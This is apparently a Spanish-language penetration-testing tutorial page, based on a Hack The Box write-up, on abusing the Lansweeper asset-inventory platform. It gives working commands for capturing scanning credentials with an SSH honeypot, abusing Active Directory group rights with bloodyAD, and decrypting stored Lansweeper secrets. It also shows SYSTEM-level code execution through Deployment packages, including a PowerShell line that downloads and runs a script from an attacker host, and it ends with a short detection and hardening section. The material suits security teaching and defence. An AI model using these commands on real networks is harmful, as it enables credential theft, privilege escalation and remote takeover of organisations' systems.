# Lansweeper Abuse: Captura de credenciales, desencriptado de secretos y RCE a través de Deployment

{{#include ../../banners/hacktricks-training.md}}

Lansweeper es una plataforma de descubrimiento e inventario de activos de TI comúnmente desplegada en Windows e integrada con Active Directory. Las credenciales configuradas en Lansweeper son usadas por sus motores de escaneo para autenticarse en activos a través de protocolos como SSH, SMB/WMI y WinRM. Las malas configuraciones frecuentemente permiten:

- Interceptación de credenciales redirigiendo un Scanning Target a un host controlado por el atacante (honeypot)
- Abuso de AD ACLs expuestas por grupos relacionados con Lansweeper para obtener acceso remoto
- Desencriptado en el host de secretos configurados en Lansweeper (connection strings y credenciales de escaneo almacenadas)
- Ejecución de código en endpoints gestionados vía la función Deployment (a menudo ejecutándose como SYSTEM)

Esta página resume flujos de trabajo prácticos y comandos para abusar de estos comportamientos durante engagements.

## 1) Capturar credenciales de escaneo vía honeypot (ejemplo SSH)

Idea: crea un Scanning Target que apunte a tu host y asigna las Scanning Credentials existentes a él. Cuando se ejecute el escaneo, Lansweeper intentará autenticarse con esas credenciales, y tu honeypot las capturará.

Resumen de pasos (UI web):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = tu IP de VPN
- Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
- Disable 'Schedule' y 'Plan' para ejecutarlo manualmente
- Scanning → Scanning Credentials → asegúrate de que existen credenciales Linux/SSH; asígnalas al nuevo target (habilita todas según necesites)
- Haz clic en “Scan now” sobre el target
- Ejecuta un SSH honeypot y recupera el usuario/contraseña intentados

Ejemplo con sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Validar credenciales capturadas contra los servicios del DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notes
- Funciona de forma similar para otros protocolos cuando puedes forzar que el escáner se conecte a tu listener (honeypots SMB/WinRM, etc.). SSH suele ser el más sencillo.
- Muchos escáneres se identifican con banners de cliente distintos (p. ej., RebexSSH) y probarán comandos benignos (uname, whoami, etc.).

## 2) AD ACL abuse: obtener acceso remoto añadiéndote a un grupo app-admin

Usa BloodHound para enumerar los derechos efectivos desde la cuenta comprometida. Un hallazgo común es un grupo específico del escáner o de la app (p. ej., “Lansweeper Discovery”) que posee GenericAll sobre un grupo privilegiado (p. ej., “Lansweeper Admins”). Si el grupo privilegiado también es miembro de “Remote Management Users”, WinRM estará disponible una vez que nos añadamos.

Collection examples:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Explotar GenericAll en un grupo con BloodyAD (Linux):
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Luego obtén un shell interactivo:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Consejo: Las operaciones de Kerberos son sensibles al tiempo. Si te encuentras con KRB_AP_ERR_SKEW, sincroniza con el DC primero:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Decrypt secretos configurados por Lansweeper en el host

En el servidor Lansweeper, el sitio ASP.NET típicamente almacena un encrypted connection string y una symmetric key usada por la aplicación. Con acceso local apropiado, puedes decrypt el DB connection string y luego extraer las scanning credentials almacenadas.

Ubicaciones típicas:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Clave de la aplicación: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Usa SharpLansweeperDecrypt para automatizar la decryption y el dumping de las creds almacenadas:
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
La salida esperada incluye detalles de conexión DB y credenciales de escaneo en texto plano, como cuentas de Windows y Linux usadas en todo el entorno. Estas a menudo tienen privilegios locales elevados en hosts del dominio:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Usar credenciales de escaneo de Windows recuperadas para acceso privilegiado:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Como miembro de “Lansweeper Admins”, la interfaz web expone Deployment y Configuration. Bajo Deployment → Deployment packages, puedes crear packages que ejecuten comandos arbitrarios en activos objetivo. La ejecución la realiza el servicio de Lansweeper con privilegios elevados, proporcionando ejecución de código como NT AUTHORITY\SYSTEM en el host seleccionado.

High-level steps:
- Crea un nuevo Deployment package que ejecute un comando de una sola línea de PowerShell o cmd (reverse shell, add-user, etc.).
- Apunta al activo deseado (p. ej., el DC/host donde corre Lansweeper) y haz clic en Deploy/Run now.
- Obtén tu shell como SYSTEM.

Example payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Las acciones de Deployment son ruidosas y dejan logs en Lansweeper y en los registros de eventos de Windows. Úsalas con moderación.

## Detección y endurecimiento

- Restringir o eliminar las enumeraciones SMB anónimas. Supervisar el RID cycling y el acceso anómalo a los shares de Lansweeper.
- Controles de salida: bloquear o restringir estrictamente SSH/SMB/WinRM salientes desde los hosts del scanner. Alertar sobre puertos no estándar (p. ej., 2022) y banners de cliente inusuales como Rebex.
- Protege `Website\\web.config` y `Key\\Encryption.txt`. Externaliza los secretos en una bóveda (vault) y rótalos si se exponen. Considera cuentas de servicio con privilegios mínimos y gMSA donde sea viable.
- Monitoreo de AD: alertar sobre cambios en grupos relacionados con Lansweeper (p. ej., “Lansweeper Admins”, “Remote Management Users”) y sobre cambios en ACL que otorguen GenericAll/Write membership en grupos privilegiados.
- Audita creaciones/cambios/ejecuciones de paquetes de Deployment; alerta sobre paquetes que lancen cmd.exe/powershell.exe o conexiones salientes inesperadas.

## Temas relacionados
- Enumeración SMB/LSA/SAMR y RID cycling
- Kerberos password spraying y consideraciones de clock skew
- Análisis de rutas con BloodHound de grupos application-admin
- Uso de WinRM y movimiento lateral

## Referencias
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
